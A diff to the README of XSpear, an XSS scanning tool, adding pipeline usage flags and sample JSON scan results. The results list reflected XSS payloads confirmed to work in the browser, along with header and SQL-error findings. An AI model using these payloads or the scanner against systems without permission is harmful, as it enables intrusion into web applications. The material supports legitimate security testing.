@@ -126,6 +126,118 @@ $ xspear -u "http://testphp.vulnweb.com/search.php?test=query" -b "https://hahwu
 # Set your blind xss host. <-b options>
 ```
 
+**for Pipeline**<br>
+```
+$ xspear -u {target} -b "your-blind-xss-host" -a -v 1 -o json
+
+# -u : target 
+# -b : testing blind xss
+# -a : test all params(test to not reflected param)
+# -v : verbose, not showing logs at value 1.
+# -o : output optios, json!
+```
+result json data
+```
+{
+    "starttime": "2019-12-25 00:02:58 +0900",
+    "endtime": "2019-12-25 00:03:31 +0900",
+    "issue_count": 25,
+    "issue_list": [{
+        "id": 0,
+        "type": "INFO",
+        "issue": "DYNAMIC ANALYSIS",
+        "method": "GET",
+        "param": "cat",
+        "payload": "XsPeaR\"",
+        "description": "Found SQL Error Pattern"
+    }, {
+        "id": 1,
+        "type": "INFO",
+        "issue": "STATIC ANALYSIS",
+        "method": "GET",
+        "param": "-",
+        "payload": "<original query>",
+        "description": "Found Server: nginx/1.4.1"
+    }, {
+        "id": 2,
+        "type": "INFO",
+        "issue": "STATIC ANALYSIS",
+        "method": "GET",
+        "param": "-",
+        "payload": "<original query>",
+        "description": "Not set HSTS"
+    }, {
+        "id": 3,
+        "type": "INFO",
+        "issue": "STATIC ANALYSIS",
+        "method": "GET",
+        "param": "-",
+        "payload": "<original query>",
+        "description": "Content-Type: text/html"
+    }, {
+        "id": 4,
+        "type": "LOW",
+        "issue": "STATIC ANALYSIS",
+        "method": "GET",
+        "param": "-",
+        "payload": "<original query>",
+        "description": "Not Set X-Frame-Options"
+    }, {
+        "id": 5,
+        "type": "MIDUM",
+        "issue": "STATIC ANALYSIS",
+        "method": "GET",
+        "param": "-",
+        "payload": "<original query>",
+        "description": "Not Set CSP"
+    }, {
+        "id": 6,
+        "type": "INFO",
+        "issue": "REFLECTED",
+        "method": "GET",
+        "param": "cat",
+        "payload": "rEfe6",
+        "description": "reflected parameter"
+    }, {
+        "id": 7,
+        "type": "INFO",
+        "issue": "FILERD RULE",
+        "method": "GET",
+        "param": "cat",
+        "payload": "onhwul=64",
+        "description": "not filtered event handler on{any} pattern"
+    }
+....
+, {
+        "id": 17,
+        "type": "HIGH",
+        "issue": "XSS",
+        "method": "GET",
+        "param": "cat",
+        "payload": "<audio src onloadstart=alert(45)>",
+        "description": "reflected HTML5 XSS Code"
+    }, {
+        "id": 18,
+        "type": "HIGH",
+        "issue": "XSS",
+        "method": "GET",
+        "param": "cat",
+        "payload": "<keygen autofocus onfocus=alert(45)>",
+        "description": "reflected onfocus XSS Code"
+ ....
+    }, {
+        "id": 24,
+        "type": "HIGH",
+        "issue": "XSS",
+        "method": "GET",
+        "param": "cat",
+        "payload": "<marquee onstart=alert(45)>",
+        "description": "triggered <marquee onstart=alert(45)>"
+    }]
+}
+```
+(Items marked as `triggered` are actually payloads that work in the browser.)
+
 etc...
 
 ### Sample log
